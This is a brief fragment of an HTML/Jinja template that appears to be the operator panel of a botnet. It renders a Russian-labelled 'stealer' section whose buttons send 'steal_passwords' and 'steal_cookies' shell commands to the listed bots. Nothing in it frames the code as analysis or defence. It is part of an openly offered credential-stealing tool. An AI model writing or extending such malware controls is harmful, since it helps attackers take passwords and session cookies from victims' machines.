...
{% if bots_list %}
    ...
    <div class="control-block stealer-buttons"><h3>Стиллер</h3>
        <button onclick="sendShellCommand('steal_passwords')">Украсть Пароли</button>
        <button onclick="sendShellCommand('steal_cookies')">Украсть Cookies</button>
    </div>
